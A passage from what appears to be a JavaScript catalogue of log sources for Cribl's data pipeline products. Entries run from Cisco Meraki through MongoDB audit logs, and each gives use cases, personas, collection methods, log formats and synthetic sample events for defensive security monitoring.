        logFormat: 'JSON — fields include protoPayload.methodName, protoPayload.serviceName, protoPayload.authenticationInfo.principalEmail, protoPayload.requestMetadata.callerIp, resource.type, resource.labels, severity, logName.',
        avgEPS: '5,000-500,000 EPS depending on project count and Data Access logging configuration',
        sampleEvent: '{"protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.v1.AuditLog","serviceName":"iam.googleapis.com","methodName":"google.iam.admin.v1.CreateServiceAccountKey","authenticationInfo":{"principalEmail":"jperks@cribl.io"},"requestMetadata":{"callerIp":"203.0.113.42","callerSuppliedUserAgent":"google-cloud-sdk gcloud/450.0.0"},"resourceName":"projects/-/serviceAccounts/automation@project-123.iam.gserviceaccount.com/keys/key-id-123"},"resource":{"type":"service_account","labels":{"project_id":"project-123","email_id":"automation@project-123.iam.gserviceaccount.com"}},"severity":"NOTICE","logName":"projects/project-123/logs/cloudaudit.googleapis.com%2Factivity","receiveTimestamp":"2026-06-11T14:32:08Z"}'
      }
    ]
  },
  {
    category: 'Network Infrastructure',
    icon: '🌐',
    sources: [
      {
        id: 'cisco-meraki',
        name: 'Cisco Meraki Security & Event Logs',
        vendor: 'Cisco Meraki',
        description: 'Cloud-managed network logs from Meraki MX security appliances, MR access points, and MS switches. Covers security events (IDS/IPS, malware, content filtering), client connectivity, system events, and air marshal wireless threat detection.',
        status: 'available',
        useCases: ['Branch Security Monitoring', 'Wireless Threat Detection', 'Content Filtering', 'Client Connectivity', 'IDS/IPS Alerting', 'Device Inventory', 'Network Performance'],
        personas: ['NOC', 'Security Engineering', 'SOC', 'Network Engineering', 'Branch IT'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for rogue AP activity, IDS signature matches, malware downloads, and content filter bypass attempts across Meraki MX fleet' },
            { persona: 'Data End User / Analyst', job: 'Investigate wireless threats detected by Air Marshal and correlate with client identity for containment' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Meraki device health, client counts, and link utilization across distributed branch locations from a single pane' },
            { persona: 'Data End User / Analyst', job: 'Track WiFi client roaming patterns, association failures, and signal quality to optimize AP placement' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume client association and URL log events while preserving security events and system alerts for SIEM routing' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Meraki syslog export and parse space-delimited event format for multi-destination routing within 20 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Datadog', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (UDP/TCP) / Meraki API / Webhook',
        logFormat: 'Syslog — space-delimited fields with epoch timestamp. Format: <timestamp> <device_serial> <log_type> <event_data>. Log types: security_event, urls, flows, ids-alerts, air_marshal, events.',
        avgEPS: '500-50,000 EPS per site depending on client count and logging configuration',
        sampleEvent: '1718107928.123456789 Q2HP-ABCD-1234 security_event ids_alerted signature=1:2024792:3 priority=1 timestamp=1718107928.123 dhost=AA:BB:CC:DD:EE:FF direction=ingress protocol=tcp/22 src=185.220.101.33:44100 dst=10.0.1.50:22 message="ET SCAN SSH Brute Force Attempt"'
      },
      {
        id: 'cisco-sdwan',
        name: 'Cisco SD-WAN (Catalyst/Viptela) Events',
        vendor: 'Cisco',
        description: 'WAN fabric telemetry and security events from Cisco SD-WAN (formerly Viptela, now Catalyst SD-WAN). Captures tunnel health metrics (jitter, latency, packet loss), SLA violations, application-aware routing decisions, DPI application classification, IPS/IDS events, URL filtering, malware protection, control plane events (OMP, BFD), and device health. Delivered via vManage syslog, NetFlow/IPFIX, or Streaming Telemetry (gRPC/YANG).',
        status: 'available',
        useCases: ['WAN Link Health Monitoring', 'SLA Violation Detection', 'Application Performance', 'Tunnel Failover Tracking', 'Branch Security Events', 'Routing Anomaly Detection', 'Bandwidth Utilization', 'Zero Trust Network Access', 'Device Compliance', 'Change Impact Analysis'],
        personas: ['NOC', 'Network Engineering', 'SRE', 'Security Engineering', 'SOC', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor WAN tunnel health (BFD sessions) across all branch sites with real-time jitter, latency, and packet loss metrics — detect SLA violations within 60 seconds and validate automatic path switching decisions' },
            { persona: 'Data End User / Analyst', job: 'Track application-aware routing decisions to verify that business-critical applications (voice, video, SaaS) are consistently placed on optimal WAN paths based on SLA policy and measured performance' },
            { persona: 'NOC', job: 'Detect branch site degradation by correlating tunnel loss metrics with application DPI classification to identify when failover to backup links causes quality degradation for latency-sensitive applications' }
          ]},
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for unauthorized route injection by identifying OMP route advertisements from unexpected originating sites, indicating compromised edge devices or route hijacking attempts' },
            { persona: 'Data End User / Analyst', job: 'Investigate policy violations by correlating SD-WAN URL filtering and IPS events with user identity (SAML integration) and branch location to identify targeted attacks against specific offices' },
            { persona: 'Data Content Creator', job: 'Detect tunnel manipulation attacks by identifying BFD flap patterns, unusual DTLS renegotiation rates, or control connection resets that could indicate man-in-the-middle or denial-of-service attacks against the WAN fabric' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter per-second BFD probe telemetry and routine OMP keep-alive events (often 70-80% of SD-WAN event volume) while preserving SLA violations, tunnel state changes, security events, and application routing decisions' },
            { persona: 'Data Engineer', job: 'Aggregate tunnel health metrics into 1-minute summaries for trend analysis while routing security events and SLA violations to SIEM for real-time alerting — reducing SIEM volume by 75%+' },
            { persona: 'Team Leader', job: 'Correlate SD-WAN bandwidth utilization with carrier billing data to identify over-provisioned links at sites where traffic patterns have shifted to direct internet access (DIA) via SASE' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure vManage syslog export to Cribl Stream with structured data parsing, or set up streaming telemetry (gRPC dial-out) for real-time metrics collection within 30 minutes per vManage instance' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'Datadog', 'Dynatrace', 'ThousandEyes', 'CrowdStrike NG SIEM', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'vManage Syslog / Streaming Telemetry (gRPC/YANG) / NetFlow/IPFIX / vManage REST API (Cribl REST Collector) / SNMP traps',
        logFormat: 'Structured syslog (vManage) or JSON (REST API/Streaming). Key event types: bfd-state-change, sla-violation, app-route-change, omp-peer-state-change, control-connection-state-change, security-event (utd), ipsec-tunnel-state. Telemetry fields: system-ip, host-name, site-id, tunnel-color, latency, jitter, loss, vqe-score, app-name, dscp, local-system-ip, remote-system-ip.',
        avgEPS: '5,000-500,000 EPS depending on site count, BFD interval, and telemetry granularity (per-second probes × site pairs generate high volume)',
        sampleEvent: '{"eventname":"sla-violation","system_ip":"10.10.1.1","host_name":"branch-nyc-01","site_id":"100","vmanage_system_ip":"10.10.0.1","entry_time":"2026-06-17T14:32:08Z","severity_level":"critical","rule_name_display":"Business-Critical-SLA","color":"mpls","remote_system_ip":"10.10.2.1","remote_color":"mpls","mean_latency":"185","mean_jitter":"42","mean_loss":"3.5","vqe_score":"2.1","sla_classes":"Bulk-Data","app_route_policy":"Production-Apps","local_color":"mpls","remote_site_id":"200"}\n{"eventname":"bfd-state-change","system_ip":"10.10.1.1","host_name":"branch-nyc-01","site_id":"100","entry_time":"2026-06-17T14:30:00Z","severity_level":"major","src_ip":"198.51.100.1","dst_ip":"203.0.113.1","color":"internet","new_state":"down","proto":"ipsec","local_system_ip":"10.10.1.1","remote_system_ip":"10.10.2.1"}'
      }
    ]
  },
  {
    category: 'Vulnerability Management',
    icon: '🔬',
    sources: [
      {
        id: 'qualys-tenable',
        name: 'Qualys / Tenable Vulnerability Scan Results',
        vendor: 'Qualys / Tenable',
        description: 'Vulnerability assessment scan results from Qualys VMDR or Tenable.io/Nessus covering host vulnerabilities, compliance checks, software inventory, and remediation status. Provides CVE-level detail with CVSS scoring and fix availability.',
        status: 'available',
        useCases: ['Vulnerability Prioritization', 'Patch Management', 'Compliance Reporting', 'Attack Surface Reduction', 'Risk Scoring', 'SLA Tracking', 'Remediation Workflow'],
        personas: ['Security Engineering', 'Vulnerability Management', 'Compliance', 'Platform Engineering', 'SOC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate active vulnerabilities with threat intelligence and network exposure to prioritize exploitable findings over theoretical risk' },
            { persona: 'Data End User / Analyst', job: 'Identify hosts with critical unpatched vulnerabilities exposed to the internet for emergency remediation' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Generate vulnerability SLA compliance reports showing mean time to remediation by severity and business unit' },
            { persona: 'Data End User / Analyst', job: 'Track vulnerability trends over time and demonstrate risk reduction to leadership' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Deduplicate vulnerability findings across overlapping scan schedules and suppress informational findings, reducing data volume by 40-60%' },
            { persona: 'Data Engineer', job: 'Route critical and high findings to SIEM for correlation while sending full scan results to Lake for compliance retention' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Qualys/Tenable API integration to pull scan results on schedule and normalize to common vulnerability schema' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'ServiceNow', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (scheduled pull) / Webhook / File export (CSV/XML)',
        logFormat: 'JSON or XML — fields include host_ip, hostname, os, qid/plugin_id, cve, cvss_base, cvss_temporal, severity, title, solution, first_found, last_found, status, port, protocol, service.',
        avgEPS: '100-10,000 EPS (bursty — high volume during scan windows, near-zero between scans)',
        sampleEvent: '{"scan_id":"scan-2026-06-11-001","host_ip":"10.0.1.50","hostname":"web-server-01","os":"Ubuntu 22.04 LTS","qid":376148,"cve":"CVE-2026-1234","cvss_base":9.8,"cvss_temporal":8.5,"severity":5,"title":"OpenSSL Buffer Overflow - Remote Code Execution","solution":"Update OpenSSL to version 3.1.5 or later","port":443,"protocol":"tcp","service":"https","first_found":"2026-06-01T00:00:00Z","last_found":"2026-06-11T14:32:08Z","status":"Active","exploitability":"Exploit Available"}'
      }
    ]
  },
  {
    category: 'ITSM / CMDB',
    icon: '📋',
    sources: [
      {
        id: 'servicenow',
        name: 'ServiceNow CMDB & Incident Events',
        vendor: 'ServiceNow',
        description: 'Configuration management and incident lifecycle events from ServiceNow covering CI changes, incident creation/updates, change requests, and CMDB relationship modifications. Enables correlation of security events with asset context and change windows.',
        status: 'available',
        useCases: ['Asset Context Enrichment', 'Change Correlation', 'Incident Automation', 'CMDB Accuracy', 'SLA Monitoring', 'Risk Assessment', 'Impact Analysis'],
        personas: ['SOC', 'Platform Engineering', 'Security Engineering', 'IT Operations', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Enrich security alerts with CMDB context (asset owner, business criticality, environment) for automated priority scoring and routing' },
            { persona: 'Data End User / Analyst', job: 'Correlate detected threats with recent change requests to distinguish authorized maintenance from unauthorized access' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Track CMDB accuracy by comparing discovered assets against registered CIs and flagging shadow IT' },
            { persona: 'Data End User / Analyst', job: 'Monitor incident volume, MTTR, and SLA compliance trends by service and priority' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Engineer', job: 'Use ServiceNow CMDB as a lookup source to enrich events in-flight, adding asset owner and criticality without storing duplicate data' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure ServiceNow REST API integration for CMDB and incident table exports to Cribl Stream for enrichment and routing' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (Table API / CMDB API) / MID Server / Event-driven webhook',
        logFormat: 'JSON — fields include sys_id, number, state, priority, assignment_group, cmdb_ci, short_description, sys_created_on, sys_updated_on, caller_id, category, subcategory, impact, urgency.',
        avgEPS: '100-5,000 EPS (event-driven from updates and scheduled CMDB syncs)',
        sampleEvent: '{"sys_id":"a1b2c3d4e5f6a7b8","number":"INC0012345","state":"New","priority":"1 - Critical","assignment_group":"Security Operations","cmdb_ci":"web-server-01","short_description":"Critical vulnerability detected on production web server","sys_created_on":"2026-06-11T14:32:08Z","caller_id":"automation","category":"Security","subcategory":"Vulnerability","impact":"1 - High","urgency":"1 - High","business_service":"Customer Portal"}'
      }
    ]
  },
  {
    category: 'Virtualization',
    icon: '🖥️',
    sources: [
      {
        id: 'vmware-vsphere',
        name: 'VMware vSphere / ESXi Event Logs',
        vendor: 'Broadcom (VMware)',
        description: 'Virtual infrastructure events from vCenter Server and ESXi hosts including VM lifecycle events, vMotion operations, host hardware alerts, storage IOPS, DRS recommendations, HA failovers, and administrative actions. Provides full visibility into the hypervisor layer.',
        status: 'available',
        useCases: ['VM Security Monitoring', 'Infrastructure Health', 'Capacity Planning', 'Change Tracking', 'Performance Optimization', 'Compliance Audit', 'Disaster Recovery Validation'],
        personas: ['Platform Engineering', 'Security Engineering', 'SOC', 'IT Operations', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect unauthorized VM operations — snapshot creation before ransomware, vMotion to unapproved hosts, root shell access on ESXi, and permission escalation in vCenter' },
            { persona: 'Data End User / Analyst', job: 'Investigate VM escape attempts and correlate ESXi shell access with vulnerability exploitation timelines' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor host CPU/memory contention, storage latency spikes, and DRS imbalance to prevent performance degradation before user impact' },
            { persona: 'Data End User / Analyst', job: 'Track HA failover events and validate DR readiness by measuring recovery time against SLA commitments' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-frequency VM heartbeat and performance counter events (95% of volume) to Lake while routing security-relevant operations to SIEM — reducing ingestion by 80-90%' },
            { persona: 'Data Engineer', job: 'Suppress per-second CPU/memory metrics that provide low value for security analysis while preserving threshold breach events' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure vCenter syslog forwarding and/or vRealize Log Insight webhook to Cribl Stream with proper event categorization by severity and type' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Cribl Lake', 'Datadog', 'Amazon S3', 'Elastic'],
        collectionMethod: 'Syslog / vRealize Log Insight webhook / vCenter REST API',
        logFormat: 'Syslog (RFC 5424) or JSON — fields include vmw_timestamp, vmw_host, vmw_cluster, vmw_vcenter, vmw_vm, vmw_user, vmw_event_type, vmw_datacenter, vmw_datastore, vmw_message.',
        avgEPS: '5,000-100,000 EPS (dominated by performance metrics; security events are low volume)',
        sampleEvent: '<134>1 2026-06-11T14:32:08.123Z vcenter-01.internal vpxd 12345 - [vmw@6876 VMName="web-prod-01" Host="esxi-node-03.internal" Cluster="Prod-Cluster-01" Datacenter="DC-East" User="admin@vsphere.local"] Event [VmMigratedEvent]: VM web-prod-01 migrated from esxi-node-03 to esxi-node-07 in cluster Prod-Cluster-01. Reason: DRS recommendation (CPU imbalance: 85% vs 22%)'
      }
    ]
  },
  {
    category: 'Secrets & PKI',
    icon: '🔑',
    sources: [
      {
        id: 'hashicorp-vault',
        name: 'HashiCorp Vault Audit Logs',
        vendor: 'HashiCorp',
        description: 'Full audit trail of every Vault interaction including secret read/write, authentication attempts, policy changes, token creation/revocation, encryption operations, and dynamic credential generation. Every API request and response is logged with full context.',
        status: 'available',
        useCases: ['Secret Access Monitoring', 'Authentication Anomaly Detection', 'Policy Violation Alerting', 'Dynamic Credential Tracking', 'Encryption Key Usage', 'Compliance Audit', 'Insider Threat Detection'],
        personas: ['Security Engineering', 'Platform Engineering', 'SOC', 'Compliance', 'DevOps'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect anomalous secret access patterns — first-time access to production secrets, bulk secret enumeration, and access from unexpected service identities or IP ranges' },
            { persona: 'Data End User / Analyst', job: 'Trace credential leakage by correlating Vault secret reads with subsequent API calls using those credentials from unauthorized systems' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Vault seal status, replication lag, token TTL exhaustion rates, and dynamic credential generation latency across clusters' },
            { persona: 'Data End User / Analyst', job: 'Track secret engine utilization, lease renewal patterns, and identify orphaned dynamic credentials that should have been revoked' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress Vault health check and token renewal noise (60-70% of audit volume) while preserving all secret access, auth, and policy events for SIEM' },
            { persona: 'Data Engineer', job: 'Route response bodies (which contain no secrets but add bulk) to null while keeping request metadata for security correlation' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Enable Vault audit device (file or syslog backend) with HMAC on sensitive fields and configure Cribl Stream to parse the nested JSON auth/request/response structure' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Cribl Lake', 'Elastic', 'Amazon S3'],
        collectionMethod: 'File audit device / Syslog audit device / Socket audit device',
        logFormat: 'JSON (NDJSON) — fields include type (request/response), auth.client_token (HMAC), auth.policies, request.path, request.operation, request.remote_address, response.data (HMAC if sensitive), error.',
        avgEPS: '1,000-20,000 EPS (scales with application secret consumption; high in microservice environments)',
        sampleEvent: '{"time":"2026-06-11T14:32:08Z","type":"request","auth":{"client_token":"hmac-sha256:a1b2c3d4","accessor":"accessor-a1b2","display_name":"approle-web-prod","policies":["web-prod-secrets","default"],"token_type":"service","token_ttl":3600},"request":{"id":"req-a1b2c3d4","operation":"read","path":"secret/data/prod/database/postgres","remote_address":"10.0.5.22","namespace":{"id":"root"}},"response":{"data":{"data":"hmac-sha256:e5f6a7b8"}}}'
      }
    ]
  },
  {
    category: 'DevOps & Collaboration',
    icon: '🛠️',
    sources: [
      {
        id: 'github-audit',
        name: 'GitHub Enterprise Audit Logs',
        vendor: 'GitHub (Microsoft)',
        description: 'Enterprise and organization audit events from GitHub covering repository access, permission changes, secret scanning alerts, code scanning findings, Actions workflow runs, and administrative operations. Tracks every sensitive operation across the software supply chain.',
        status: 'available',
        useCases: ['Supply Chain Security', 'Code Access Monitoring', 'Secret Leak Detection', 'CI/CD Pipeline Security', 'Permission Drift Detection', 'Compliance Audit', 'Insider Threat Detection'],
        personas: ['Security Engineering', 'SOC', 'Platform Engineering', 'DevOps', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect supply chain attack indicators — new collaborator access to sensitive repos, workflow modifications, secret scanning bypass, and bulk repository cloning by single actors' },
            { persona: 'Data End User / Analyst', job: 'Investigate repository permission escalations and correlate with code changes to detect insider threat or compromised developer accounts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor GitHub Actions runner utilization, workflow failure rates, self-hosted runner health, and API rate limit consumption' },
            { persona: 'Data End User / Analyst', job: 'Track repository growth, PR merge velocity, and identify bottlenecks in CI/CD pipeline performance' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter git push/pull metadata and webhook delivery events (high volume, low security value) to Lake while routing permission changes and secret alerts to SIEM — 55-70% reduction' },
            { persona: 'Data Engineer', job: 'Suppress Actions workflow step-level logging that inflates audit volume while preserving workflow-level security events' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure GitHub audit log streaming to Cribl Stream via webhook or S3 export with proper enterprise/org/repo hierarchy normalization' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Audit log streaming (webhook/S3/Azure Event Hub) / REST API',
        logFormat: 'JSON — fields include @timestamp, action, actor, actor_location, org, repo, user, data, created_at, business, operation_type.',
        avgEPS: '500-10,000 EPS (scales with developer count and CI/CD activity)',
        sampleEvent: '{"@timestamp":"2026-06-11T14:32:08Z","action":"repo.create","actor":"mthompson","actor_location":{"country_code":"US"},"org":"cribl-io","repo":"cribl-io/internal-tools","visibility":"private","business":"cribl-enterprise","operation_type":"create","created_at":"2026-06-11T14:32:08Z","actor_ip":"198.51.100.45"}'
      },
      {
        id: 'atlassian-audit',
        name: 'Atlassian Cloud Audit Logs (Jira / Confluence)',
        vendor: 'Atlassian',
        description: 'Organization-level audit events from Atlassian Cloud covering user access, permission changes, app installations, data export requests, and administrative actions across Jira and Confluence. Provides visibility into collaboration platform security and compliance.',
        status: 'available',
        useCases: ['Data Exfiltration Detection', 'Permission Monitoring', 'App Security', 'Compliance Audit', 'Access Anomaly Detection', 'IP Protection', 'User Activity Monitoring'],
        personas: ['Security Engineering', 'SOC', 'Compliance', 'IT Operations', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect potential data exfiltration via bulk Confluence space exports, mass Jira issue downloads, or unauthorized third-party app installations with broad permissions' },
            { persona: 'Data End User / Analyst', job: 'Identify compromised accounts through anomalous Jira/Confluence access patterns — geographic anomalies, first-time project access, bulk content views' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Atlassian API rate limits, app performance, webhook delivery health, and user license consumption trends' },
            { persona: 'Data End User / Analyst', job: 'Track project activity patterns, identify inactive spaces/projects for cleanup, and measure team collaboration health metrics' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter page view and issue view events (90%+ of volume) to Lake while routing permission changes, exports, and app events to SIEM — 80-90% reduction' },
            { persona: 'Data Engineer', job: 'Deduplicate webhook retry events and suppress automated bot activity that inflates audit volume' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Atlassian Organization Audit Log API integration with Cribl Stream for continuous pull of admin and security events' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'REST API (Organization Audit Log API) / Webhook',
        logFormat: 'JSON — fields include id, summary, created, category, author (accountId, displayName), context (ip, location), actor, objectItem (id, name, typeName), container, associatedItems.',
        avgEPS: '200-5,000 EPS (driven by org size and user activity)',
        sampleEvent: '{"id":"a1b2c3d4-e5f6-7890","summary":"User granted admin access to project","created":"2026-06-11T14:32:08.000Z","category":"permissions","author":{"id":"user-001","name":"admin@cribl.io","type":"user"},"objectItem":{"id":"proj-001","name":"Security Operations","typeName":"PROJECT"},"container":{"id":"site-001","name":"cribl.atlassian.net","typeName":"SITE"},"associatedItems":[{"id":"user-002","name":"mthompson@cribl.io","typeName":"USER","parentId":"proj-001"}],"context":{"ip":"198.51.100.45","location":"San Francisco, US"},"action":"project_admin_added"}'
      }
    ]
  },
  {
    category: 'XDR / Threat Intelligence',
    icon: '🎯',
    sources: [
      {
        id: 'paloalto-cortex-xdr',
        name: 'Palo Alto Cortex XDR Agent & Alert Logs',
        vendor: 'Palo Alto Networks',
        description: 'Extended detection and response telemetry from Cortex XDR agents covering endpoint alerts, behavioral analytics, incident correlations, and raw agent telemetry. Combines endpoint, network, and cloud signals into unified detection with full causality chain.',
        status: 'available',
        useCases: ['Endpoint Threat Detection', 'Behavioral Analytics', 'Incident Correlation', 'Causality Chain Analysis', 'Threat Hunting', 'Response Automation', 'Agent Health Monitoring'],
        personas: ['SOC', 'Security Engineering', 'Incident Response', 'Threat Hunting', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate Cortex XDR behavioral alerts with network and identity events to build comprehensive attack narratives spanning endpoint-to-cloud kill chains' },
            { persona: 'Data End User / Analyst', job: 'Use XDR causality chains to rapidly scope incidents — identifying patient zero, lateral movement paths, and all affected assets from a single alert' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor XDR agent deployment coverage, version drift, connectivity status, and policy sync failures across the fleet' },
            { persona: 'Data End User / Analyst', job: 'Track alert volume trends by MITRE technique, host group, and severity to measure detection efficacy and identify blind spots' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Route raw agent telemetry (process creation, file operations, network connections — 95% of volume) to Lake while sending alerts and incidents to SIEM — massive 85-95% ingestion reduction' },
            { persona: 'Data Engineer', job: 'Deduplicate XDR alerts that fire on the same causality chain and consolidate into single enriched events for SIEM consumption' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Cortex XDR syslog forwarding or API-based log collection and normalize alert severity/category into common schema alongside other detection tools' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (CEF) / REST API (Incidents & Alerts) / XDR Broker',
        logFormat: 'CEF or JSON — fields include alert_id, alert_name, severity, category, mitre_tactic, mitre_technique, host_name, host_ip, user_name, action_taken, causality_chain_id, incident_id, agent_version.',
        avgEPS: '10,000-500,000 EPS (raw telemetry is extremely high volume; alerts are low volume subset)',
        sampleEvent: 'CEF:0|Palo Alto Networks|Cortex XDR|3.5|Behavioral Threat|Suspicious PowerShell Execution|8|rt=2026-06-11T14:32:08Z dhost=workstation-042 duser=mthompson@cribl.io src=10.0.1.50 act=Detected cs1=T1059.001 cs1Label=MITRE_Technique cs2=Execution cs2Label=MITRE_Tactic cs3=causality-a1b2c3 cs3Label=CausalityID cs4=INC-2026-0611-001 cs4Label=IncidentID cn1=85 cn1Label=AlertScore deviceProcessName=powershell.exe msg=PowerShell executing encoded command with network callback to external IP 185.234.72.11'
      }
    ]
  },
  {
    category: 'Database',
    icon: '🗄️',
    sources: [
      {
        id: 'mongodb-audit',
        name: 'MongoDB Audit Logs',
        vendor: 'MongoDB',
        description: 'Database audit events from MongoDB covering authentication attempts, authorization checks (authCheck), CRUD operations, schema changes (DDL), role/user management, and replica set configuration changes. Available in native JSON (mongo schema) or OCSF format.',
        status: 'available',
        useCases: ['Database Access Monitoring', 'Privilege Escalation Detection', 'Schema Change Tracking', 'Failed Authentication Detection', 'Compliance Auditing', 'Data Exfiltration Detection', 'Replica Set Security'],
        personas: ['SOC', 'Security Engineering', 'DBA', 'Compliance', 'Data Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect unauthorized database access patterns — bulk collection reads from unusual IPs, privilege escalation via role grants, and authentication brute-force against production clusters' },
            { persona: 'Data End User / Analyst', job: 'Investigate data exfiltration by correlating large query result sets with source IPs outside expected application server ranges' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all privileged operations (user/role creation, collection drops, reconfig) for SOC 2 and PCI-DSS database access requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate audit reports showing all access to collections containing PII/PHI data with full user attribution and timestamp' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter successful authCheck events for read operations on non-sensitive collections (80-90% of audit volume) while preserving writes, failures, and DDL — reducing database audit log ingest by 75-85%' },
            { persona: 'Data Engineer', job: 'Route authentication failures and DDL changes to SIEM while sending full audit trail to Lake for compliance retention at lower cost' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure mongod auditLog destination (file or syslog) and set up collection-level audit filters to capture security-relevant events without overwhelming log volume' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'File monitor (auditLog JSON) / Syslog / MongoDB Atlas API (Database Auditing)',
        logFormat: 'JSON (mongo schema) — fields include atype (authenticate, authCheck, createCollection, dropDatabase, createUser, etc), ts ($date ISO 8601), uuid, local (ip, port), remote (ip, port), users [{user, db}], roles [{role, db}], param (operation-specific), result (0=success, error code otherwise).',
        avgEPS: '5,000-200,000 EPS (authCheck on every read/write generates extreme volume; auth events are small subset)',
        sampleEvent: '{"atype":"authCheck","ts":{"$date":"2026-06-16T14:32:08.234+0000"},"uuid":{"$binary":"abc123def456","$type":"04"},"local":{"ip":"10.0.5.22","port":27017},"remote":{"ip":"185.234.72.11","port":49152},"users":[],"roles":[],"param":{"command":"find","ns":"production.customers","args":{"filter":{"ssn":{"$exists":true}}}},"result":13}'
      },
      {
        id: 'postgresql-audit',
        name: 'PostgreSQL pgAudit Logs',
        vendor: 'PostgreSQL / pgAudit',
